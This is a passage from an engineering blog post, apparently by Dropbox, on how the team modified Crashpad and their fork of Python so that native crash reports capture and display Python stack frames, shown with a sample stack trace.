TlsAlloc is used to allocate thread-local “slots” stored in a predictable/documented location in the Thread Environment Block .aspx) Note: We contributed fixes to Crashpad to make this readily available Common to all platforms, however, is that the Python-specific state is stored at a specific offset of the native thread state. Sadly, this offset is not static: it can change depending on various factors. This offset is determined early in the Python runtime’s setup (see PyInitialize ): this is referred to as the thread-specific storage “key”. This step creates a single “slot” of thread-specific storage for all threads in the process, which is then used by Python to store its thread-specific state. So if crashpad can retrieve the TSS “key” for the instance of the process, it will have the ability to read the PyThreadState for any given thread. Getting the Thread-Local Storage “Key” We considered multiple ways of doing this, but settled on a method inspired by Crashpad itself. In the end, we modified our fork of Python to expose the runtime state (including the TSS key) in a named section of the binary (i.e. __DATA ). Thus, all instances of Dropbox would now expose the Python runtime state in a way that makes it easy to retrieve it from Crashpad. This was achieved with a simple __attribute__ in Clang and by using __declspec on Windows. This is already simple to use in Crashpad, because it uses the same technique to allow clients to add annotations to their own process (see CrashpadInfo). This is also well-aligned with Python’s own evolving design for the interpreter internals, as it recently reorganized itself to consolidate runtime state into a single struct, _PyRuntime (in Python/pylifecycle.c ). This structure includes the TSS key, along with other information of potential interest to debug tools. Note: We’ve submitted this change as a pull request to the Python project, in case it can be helpful to others. Now that Crashpad can determine the TSS key, it has access to each thread’s PyThreadState . The next step is to interpret this state, extract the relevant information, and send it as part of a crash report. Parsing Python Stack Frames In CPython, “frames” are the unit of function execution, and the Python analogue to native stack frames. The PyThreadState maintains them as a stack of PyFrameObjects . The topmost frame at any given time is pointed to by the thread state using a single pointer. Given this setup and the TSS key, we can start from a native thread, find the PyThreadState , then “walk the stack” of PyFrameObjects . However, this is trickier than it sounds. We can’t just #include <Python.h> and call the same functions faulthandler does: as Crashpad’s handler runs in a separate process, it doesn’t have direct access to this state. Instead, we had to use Crashpad’s utilities to reach into the crashing process’s memory and maintain our own “copies” of the relevant Python structs to interpret the raw data. This is a necessarily brittle solution, but we’ve mitigated the cost of ongoing maintenance by introducing automated tests that ensure that any updates to Python’s core structs to also require an update our Crashpad fork. For every frame, our objective is to resolve it to a code location. Each PyFrameObject has a pointer to a PyCodeObject including information about the function name, file name, and line number (faulthandler leverages the same information). The filename and function name are maintained as Python strings. Decoding Python strings can be fairly involved, as they are built on a hierarchy of types (we’ll spare you the details, but see unicodeobject.h ). For simplicity, we assume all function and file names are ASCII-encoded (mapping to the simple PyASCIIObject ). Getting the line number is slightly more complicated. To save space, while being able to map every byte code instruction to Python source, Python compresses line numbers into a table ( PyCodeObject‘s co_lnotab ). The algorithm to decode this table is well -d efined , so we re-implemented it in our Crashpad fork. A note on the Python 3 transition : As Python 2 and 3 have slightly different implementations, we maintained support for both versions of the Python structs in our Crashpad fork during the transition. Stack Frame Reconstitution Now that Crashpad’s reports include all the Python stack frames, we can improve symbolication. To do so, we modified our server infrastructure to parse our extensions to minidumps and extract these stacks. Specifically, we augmented our crash management system, Crashdash, to display Python stack frame information (if it is available) for native crash reports. This is achieved by “walking the stack” again, but this time, for each native frame calling PyEval_EvalFrameEx , we “pop” the matching PyFrameObject capture from the report. Since we now have the function name, file name, and line number for each of those frames we can now show the matching function calls. We can thus extract the underlying Python stack trace from the one above: Copy file \"ui/common/tray.py\", line 758, in _do_segfault\r\nfile \"dropbox/client/ui/cocoa/menu.py\", line 169, in menuAction_\r\nfile \"dropbox/gui.py\", line 274, in guarantee_message_queue\r\nfile \"dropbox/gui.py\", line 299, in handle_exceptions\r\nfile \"PyObjCTools/AppHelper.py\", line 303, in runEventLoop\r\nfile \"ui/cocoa/uikit.py\", line 256, in mainloop\r\nfile \"ui/cocoa/uikit.py\", line 929, in mainloop\r\nfile \"dropbox/client/main.py\", line 3263, in run\r\nfile \"dropbox/client/main.py\", line 6904, in main_startup\r\nfile \"dropbox/client/main.py\", line 7000, in main Wrapping up With this system in place, our developers are capable of directly investigating all crashes, whether they occur in Python, C, C++, or Objective-C. In addition, the new monitoring we introduced to measure the system’s reliability has given us added confidence our application is performing as it should. The result is a more stable application for our desktop users. Case in point: using this new system, we were able to perform the Python 2 to 3 transition without fear that our users would be negatively affected. Nikhil gave a talk at PyGotham 2018 that dives into Python stack frame implementation details and explains our strategy for using Crashpad. The slides are available now (videos will be up soon). Interested? If the type of problem solving we described sounds fun and you want to take on the challenges of desktop Python development at scale, consider joining us! Footnotes: 1 A SIGSEGV cannot be handled asynchronously due to how signals are implemented. When a CPU instruction attempts to access an invalid location, it triggers a page fault. This is handled by the OS. The OS will first rewind the instruction pointer to go back to the beginning of this instruction, since it needs to resume execution of the program once the signal handler returns. The first time, the signal handler is triggered. Once it returns, execution resumes. The OS tracks that a handler was already invoked. When the fault is triggered again, this specific signal is masked so that no handler runs. At this point, the behavior for a SIGSEGV is to core dump the process and abort it. Our asynchronous handler effectively never runs. The faulthandler module specifically supports synchronous capture of Python stacks, but it can only save these to a file. No network activity or Python execution is allowed due to signal safety requirements. These various complications, and the clear benefits of Crashpad in other areas, made it compelling to switch. // Tags Application Desktop Client // Copy link Link copied Link copied", "date": "2018-11-05"}
]